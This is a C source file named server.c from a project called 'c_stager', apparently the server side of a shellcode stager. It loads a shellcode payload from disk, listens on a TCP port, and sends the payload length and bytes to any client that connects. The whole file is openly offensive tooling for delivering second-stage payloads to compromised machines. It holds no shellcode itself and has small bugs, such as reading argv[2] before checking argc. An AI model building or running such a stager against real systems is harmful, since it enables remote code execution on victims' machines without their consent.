/*
 * Project: c_stager
 * File: server.c
 * Created by Thomas John Wesolowski on 6/2/2017
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

typedef unsigned char byte_t;

/**
 * Loads payload shellcode from path pointed to by 'path'.
 * @param path File path to load payload from
 * @param payload byte array containing loaded shellcode
 * @return number of bytes read, -1 on failure
 */
int load_payload(char *path, byte_t **payload) {
    FILE *pld = fopen(path, "rb");
    if (pld == NULL) {
        fprintf(stderr, "Could not open payload file.");
        return -1;
    }
    /*
     * Get file size, using int here, as shellcode length
     * is by design only a few bytes in length. Can be edited later
     * should the need arise.
     */
    int size = 0;
    fseek(pld, 0, SEEK_END);
    size = ftell(pld);
    fseek(pld, 0, SEEK_SET);

    /*
     * Allocate memory for payload so it is not read directly from disc
     * when transmitting.
     * Read payload into memory.
     */
    *payload = (byte_t *) malloc(size * sizeof(byte_t));
    for (int i = 0; i < size; i++) {
        //TODO determine if endianess matters, but shouldn't as we are reading byte-by-byte
        fread(*payload + i, 1, 1, pld);
    }
    return size;
}

int main(int argc, char **argv) {
    /*
     * Declare socket file descriptors for socket syscall, and accept syscall.
     * Also declare variable to hold port number information.
     * Also declare variable to hold size of client address, and declare
     * another variable to hold result of syscalls like read and write.
     */
    int sockfd, acceptfd, portn, len_cli, res;


    //declare variable to store shellcode and length of shellcode
    byte_t *payld;
    int payld_sz;

    payld_sz = load_payload(argv[2], &payld);

    //declare byte buffer to store transferred information
    byte_t buf[256];

    //declare structs to store address of server and client
    struct sockaddr_in serv_addr, cli_addr;

    if (argc < 2) {
        fprintf(stderr, "Please specify port.");
        exit(1);
    }
    //create socket in the internet domain using tcp protocol, and port number
    //provided by user
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "Could not open socket.");
        exit(2);
    }
    //set all of struct serv_addr to 0
    bzero((char *) &serv_addr, sizeof(serv_addr));

    portn = atoi(argv[1]);
    //TODO fix htons call by adding error checking to verify port number is valid.
    //Add address description information
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(portn);
    serv_addr.sin_addr.s_addr = INADDR_ANY;

    //Bind socket to address
    if(bind(sockfd,(struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0){
        perror("Could not bind socket to address.");
    }
    //set socket to listen for incoming connections
    listen(sockfd, 5);

    len_cli = sizeof(cli_addr);
    //The accept() call here is blocking, and thus the result need not be verified
    acceptfd = accept(sockfd, (struct sockaddr *) &cli_addr, (socklen_t *) &len_cli);
    printf("Connected to client");
    bzero(buf, 256);

    //Transmit size of payload, then send
    write(acceptfd,&payld_sz,4);
    write(acceptfd,payld,payld_sz);
    return 0;
}